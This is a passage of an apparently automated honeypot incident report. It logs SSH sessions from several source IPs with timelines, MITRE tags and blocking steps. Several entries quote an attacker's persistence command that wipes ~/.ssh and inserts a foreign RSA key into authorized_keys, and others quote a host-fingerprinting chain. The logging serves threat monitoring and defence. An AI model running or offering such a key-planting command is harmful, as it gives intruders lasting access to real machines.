| `2026-06-30 13:59:32` | `cowrie.command.input` |
| `2026-06-30 13:59:32` | `cowrie.command.input` |
| `2026-06-30 13:59:32` | `cowrie.command.input` |
| `2026-06-30 13:59:32` | `cowrie.command.input` |
| `2026-06-30 13:59:32` | `cowrie.log.closed` |
| `2026-06-30 13:59:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-16e033a4aac3

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-06-30 14:05 |
| **Last Seen** | 2026-06-30 14:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 14:05:12` | `cowrie.session.connect` |
| `2026-06-30 14:05:12` | `cowrie.client.version` |
| `2026-06-30 14:05:12` | `cowrie.client.kex` |
| `2026-06-30 14:05:13` | `cowrie.login.success` |
| `2026-06-30 14:05:13` | `cowrie.session.params` |
| `2026-06-30 14:05:13` | `cowrie.command.input` |
| `2026-06-30 14:05:13` | `cowrie.command.input` |
| `2026-06-30 14:05:13` | `cowrie.command.input` |
| `2026-06-30 14:05:13` | `cowrie.command.input` |
| `2026-06-30 14:05:13` | `cowrie.command.input` |
| `2026-06-30 14:05:13` | `cowrie.command.success` |
| `2026-06-30 14:05:13` | `cowrie.command.input` |
| `2026-06-30 14:05:13` | `cowrie.command.input` |
| `2026-06-30 14:05:13` | `cowrie.command.input` |
| `2026-06-30 14:05:13` | `cowrie.command.input` |
| `2026-06-30 14:05:13` | `cowrie.log.closed` |
| `2026-06-30 14:05:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f9e7211ec75d

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-06-30 14:06 |
| **Last Seen** | 2026-06-30 14:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 14:06:59` | `cowrie.session.connect` |
| `2026-06-30 14:06:59` | `cowrie.client.version` |
| `2026-06-30 14:06:59` | `cowrie.client.kex` |
| `2026-06-30 14:07:00` | `cowrie.login.success` |
| `2026-06-30 14:07:00` | `cowrie.session.params` |
| `2026-06-30 14:07:00` | `cowrie.command.input` |
| `2026-06-30 14:07:00` | `cowrie.log.closed` |
| `2026-06-30 14:07:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c1e45d5fdbe2

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-06-30 14:09 |
| **Last Seen** | 2026-06-30 14:09 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 14:09:09` | `cowrie.session.connect` |
| `2026-06-30 14:09:11` | `cowrie.client.version` |
| `2026-06-30 14:09:11` | `cowrie.client.kex` |
| `2026-06-30 14:09:16` | `cowrie.login.success` |
| `2026-06-30 14:09:20` | `cowrie.session.params` |
| `2026-06-30 14:09:20` | `cowrie.command.input` |
| `2026-06-30 14:09:22` | `cowrie.log.closed` |
| `2026-06-30 14:09:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f71fad742cee

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-06-30 14:10 |
| **Last Seen** | 2026-06-30 14:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 14:10:24` | `cowrie.session.connect` |
| `2026-06-30 14:10:24` | `cowrie.client.version` |
| `2026-06-30 14:10:24` | `cowrie.client.kex` |
| `2026-06-30 14:10:24` | `cowrie.login.success` |
| `2026-06-30 14:10:25` | `cowrie.session.params` |
| `2026-06-30 14:10:25` | `cowrie.command.input` |
| `2026-06-30 14:10:25` | `cowrie.command.input` |
| `2026-06-30 14:10:25` | `cowrie.command.input` |
| `2026-06-30 14:10:25` | `cowrie.command.input` |
| `2026-06-30 14:10:25` | `cowrie.command.input` |
| `2026-06-30 14:10:25` | `cowrie.command.success` |
| `2026-06-30 14:10:25` | `cowrie.command.input` |
| `2026-06-30 14:10:25` | `cowrie.command.input` |
| `2026-06-30 14:10:25` | `cowrie.command.input` |
| `2026-06-30 14:10:25` | `cowrie.command.input` |
| `2026-06-30 14:10:25` | `cowrie.log.closed` |
| `2026-06-30 14:10:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-de48ebbb3459

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-06-30 14:14 |
| **Last Seen** | 2026-06-30 14:14 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 14:14:01` | `cowrie.session.connect` |
| `2026-06-30 14:14:01` | `cowrie.client.version` |
| `2026-06-30 14:14:01` | `cowrie.client.kex` |
| `2026-06-30 14:14:04` | `cowrie.login.success` |
| `2026-06-30 14:14:06` | `cowrie.session.params` |
| `2026-06-30 14:14:06` | `cowrie.command.input` |
| `2026-06-30 14:14:07` | `cowrie.log.closed` |
| `2026-06-30 14:14:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7fefeee6d220

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-06-30 14:15 |
| **Last Seen** | 2026-06-30 14:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 14:15:58` | `cowrie.session.connect` |
| `2026-06-30 14:15:58` | `cowrie.client.version` |
| `2026-06-30 14:15:58` | `cowrie.client.kex` |
| `2026-06-30 14:15:58` | `cowrie.login.success` |
| `2026-06-30 14:15:59` | `cowrie.session.params` |
| `2026-06-30 14:15:59` | `cowrie.command.input` |
| `2026-06-30 14:15:59` | `cowrie.command.input` |
| `2026-06-30 14:15:59` | `cowrie.command.input` |
| `2026-06-30 14:15:59` | `cowrie.command.input` |
| `2026-06-30 14:15:59` | `cowrie.command.input` |
| `2026-06-30 14:15:59` | `cowrie.command.success` |
| `2026-06-30 14:15:59` | `cowrie.command.input` |
| `2026-06-30 14:15:59` | `cowrie.command.input` |
| `2026-06-30 14:15:59` | `cowrie.command.input` |
| `2026-06-30 14:15:59` | `cowrie.command.input` |
| `2026-06-30 14:15:59` | `cowrie.log.closed` |
| `2026-06-30 14:15:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f757c70f7e4e

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-06-30 14:20 |
| **Last Seen** | 2026-06-30 14:20 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 14:20:43` | `cowrie.session.connect` |
| `2026-06-30 14:20:44` | `cowrie.client.version` |
| `2026-06-30 14:20:44` | `cowrie.client.kex` |
| `2026-06-30 14:20:51` | `cowrie.login.success` |
| `2026-06-30 14:20:54` | `cowrie.session.params` |
| `2026-06-30 14:20:54` | `cowrie.command.input` |
| `2026-06-30 14:20:55` | `cowrie.log.closed` |
| `2026-06-30 14:20:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6a9995d386ba

| Field | Detail |
|---|---|
| **Source IP** | `34.53.135[.]16` |
| **First Seen** | 2026-06-30 14:21 |
| **Last Seen** | 2026-06-30 14:21 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0[.]0 Safari/537.36, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 14:21:27` | `cowrie.session.connect` |
| `2026-06-30 14:21:27` | `cowrie.login.success` |
| `2026-06-30 14:21:28` | `cowrie.session.params` |
| `2026-06-30 14:21:28` | `cowrie.command.input` |
| `2026-06-30 14:21:28` | `cowrie.command.input` |
| `2026-06-30 14:21:28` | `cowrie.command.failed` |
| `2026-06-30 14:21:28` | `cowrie.command.input` |
| `2026-06-30 14:21:28` | `cowrie.log.closed` |
| `2026-06-30 14:21:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.53.135[.]16` to AbuseIPDB if not already reported
- [ ] Block `34.53.135[.]16` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4471be0a0fbe

| Field | Detail |
|---|---|
| **Source IP** | `34.53.135[.]16` |
| **First Seen** | 2026-06-30 14:21 |
| **Last Seen** | 2026-06-30 14:21 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `PING` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 14:21:41` | `cowrie.session.connect` |
| `2026-06-30 14:21:41` | `cowrie.login.success` |
| `2026-06-30 14:21:41` | `cowrie.session.params` |
| `2026-06-30 14:21:41` | `cowrie.command.input` |
| `2026-06-30 14:21:41` | `cowrie.command.failed` |
| `2026-06-30 14:21:46` | `cowrie.log.closed` |
| `2026-06-30 14:21:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.53.135[.]16` to AbuseIPDB if not already reported
- [ ] Block `34.53.135[.]16` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d53da88f82f6

| Field | Detail |
|---|---|
| **Source IP** | `34.53.135[.]16` |
| **First Seen** | 2026-06-30 14:21 |
| **Last Seen** | 2026-06-30 14:21 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 14:21:43` | `cowrie.session.connect` |
| `2026-06-30 14:21:43` | `cowrie.login.success` |
| `2026-06-30 14:21:43` | `cowrie.session.params` |
| `2026-06-30 14:21:43` | `cowrie.command.input` |
| `2026-06-30 14:21:46` | `cowrie.log.closed` |
| `2026-06-30 14:21:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.53.135[.]16` to AbuseIPDB if not already reported
- [ ] Block `34.53.135[.]16` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cb34ae6d6f6c

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]10` |
| **First Seen** | 2026-06-30 14:26 |
| **Last Seen** | 2026-06-30 14:26 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST, /bin/busybox TEST, cat /proc, ./` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 14:26:43` | `cowrie.session.connect` |
| `2026-06-30 14:26:43` | `cowrie.login.success` |
| `2026-06-30 14:26:44` | `cowrie.session.params` |
| `2026-06-30 14:26:45` | `cowrie.command.input` |
| `2026-06-30 14:26:45` | `cowrie.command.input` |
| `2026-06-30 14:26:46` | `cowrie.command.input` |
| `2026-06-30 14:26:46` | `cowrie.command.input` |
| `2026-06-30 14:26:46` | `cowrie.command.failed` |
| `2026-06-30 14:26:47` | `cowrie.log.closed` |
| `2026-06-30 14:26:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]10` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]10` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2fcbbb664fee

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-06-30 14:30 |
| **Last Seen** | 2026-06-30 14:30 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 14:30:34` | `cowrie.session.connect` |
| `2026-06-30 14:30:35` | `cowrie.client.version` |
| `2026-06-30 14:30:35` | `cowrie.client.kex` |
| `2026-06-30 14:30:36` | `cowrie.login.success` |
| `2026-06-30 14:30:38` | `cowrie.session.params` |
| `2026-06-30 14:30:38` | `cowrie.command.input` |
| `2026-06-30 14:30:38` | `cowrie.log.closed` |
| `2026-06-30 14:30:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f97a4b0bc2e6

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-06-30 14:32 |
| **Last Seen** | 2026-06-30 14:33 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 14:32:55` | `cowrie.session.connect` |
| `2026-06-30 14:32:57` | `cowrie.client.version` |
| `2026-06-30 14:32:57` | `cowrie.client.kex` |
| `2026-06-30 14:33:03` | `cowrie.login.success` |
| `2026-06-30 14:33:06` | `cowrie.session.params` |
| `2026-06-30 14:33:06` | `cowrie.command.input` |
| `2026-06-30 14:33:08` | `cowrie.log.closed` |
| `2026-06-30 14:33:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3d980bda15b0

| Field | Detail |
|---|---|
| **Source IP** | `191.7.26[.]153` |
| **First Seen** | 2026-06-30 14:34 |
| **Last Seen** | 2026-06-30 14:35 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 14:34:56` | `cowrie.session.connect` |
| `2026-06-30 14:34:56` | `cowrie.client.version` |
| `2026-06-30 14:34:57` | `cowrie.client.kex` |
| `2026-06-30 14:34:57` | `cowrie.login.success` |
| `2026-06-30 14:34:58` | `cowrie.session.params` |
| `2026-06-30 14:34:58` | `cowrie.command.input` |
| `2026-06-30 14:34:58` | `cowrie.command.failed` |
| `2026-06-30 14:34:58` | `cowrie.log.closed` |
| `2026-06-30 14:34:59` | `cowrie.session.params` |
| `2026-06-30 14:34:59` | `cowrie.command.input` |
| `2026-06-30 14:34:59` | `cowrie.session.file_download` |
| `2026-06-30 14:34:59` | `cowrie.log.closed` |
| `2026-06-30 14:35:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `191.7.26[.]153` to AbuseIPDB if not already reported
- [ ] Block `191.7.26[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-09ff05a8c6d1

| Field | Detail |
|---|---|
| **Source IP** | `191.7.26[.]153` |
| **First Seen** | 2026-06-30 14:34 |
| **Last Seen** | 2026-06-30 14:35 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 14:34:59` | `cowrie.session.connect` |
| `2026-06-30 14:34:59` | `cowrie.client.version` |
| `2026-06-30 14:34:59` | `cowrie.client.kex` |
| `2026-06-30 14:35:00` | `cowrie.login.success` |
| `2026-06-30 14:35:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `191.7.26[.]153` to AbuseIPDB if not already reported
- [ ] Block `191.7.26[.]153` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d6563fc0cba5

| Field | Detail |
|---|---|
| **Source IP** | `191.7.26[.]153` |
| **First Seen** | 2026-06-30 14:35 |
| **Last Seen** | 2026-06-30 14:35 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 14:35:00` | `cowrie.session.connect` |
| `2026-06-30 14:35:00` | `cowrie.client.version` |
| `2026-06-30 14:35:00` | `cowrie.client.kex` |
| `2026-06-30 14:35:01` | `cowrie.login.success` |
| `2026-06-30 14:35:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `191.7.26[.]153` to AbuseIPDB if not already reported
- [ ] Block `191.7.26[.]153` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8b4395bb8e40

| Field | Detail |
|---|---|
| **Source IP** | `102.223.92[.]101` |
| **First Seen** | 2026-06-30 14:37 |
| **Last Seen** | 2026-06-30 14:38 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 14:37:58` | `cowrie.session.connect` |
| `2026-06-30 14:37:58` | `cowrie.client.version` |
| `2026-06-30 14:37:59` | `cowrie.client.kex` |
| `2026-06-30 14:37:59` | `cowrie.login.success` |
| `2026-06-30 14:38:00` | `cowrie.session.params` |
| `2026-06-30 14:38:00` | `cowrie.command.input` |
| `2026-06-30 14:38:00` | `cowrie.command.failed` |
| `2026-06-30 14:38:01` | `cowrie.log.closed` |
| `2026-06-30 14:38:02` | `cowrie.session.params` |
| `2026-06-30 14:38:02` | `cowrie.command.input` |
| `2026-06-30 14:38:02` | `cowrie.session.file_download` |
| `2026-06-30 14:38:02` | `cowrie.log.closed` |
| `2026-06-30 14:38:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.223.92[.]101` to AbuseIPDB if not already reported
- [ ] Block `102.223.92[.]101` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-297adcf65663

| Field | Detail |
|---|---|
| **Source IP** | `102.223.92[.]101` |
| **First Seen** | 2026-06-30 14:38 |
| **Last Seen** | 2026-06-30 14:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 14:38:02` | `cowrie.session.connect` |
| `2026-06-30 14:38:02` | `cowrie.client.version` |
| `2026-06-30 14:38:03` | `cowrie.client.kex` |
| `2026-06-30 14:38:04` | `cowrie.login.success` |
| `2026-06-30 14:38:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.223.92[.]101` to AbuseIPDB if not already reported
- [ ] Block `102.223.92[.]101` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-851f15ddd1d3

| Field | Detail |
|---|---|
| **Source IP** | `102.223.92[.]101` |
| **First Seen** | 2026-06-30 14:38 |
| **Last Seen** | 2026-06-30 14:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 14:38:04` | `cowrie.session.connect` |
| `2026-06-30 14:38:04` | `cowrie.client.version` |
| `2026-06-30 14:38:05` | `cowrie.client.kex` |
| `2026-06-30 14:38:06` | `cowrie.login.success` |
| `2026-06-30 14:38:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.223.92[.]101` to AbuseIPDB if not already reported
- [ ] Block `102.223.92[.]101` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-35e6204987ba

| Field | Detail |
|---|---|
| **Source IP** | `223.123.124[.]70` |
| **First Seen** | 2026-06-30 14:38 |
| **Last Seen** | 2026-06-30 14:38 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
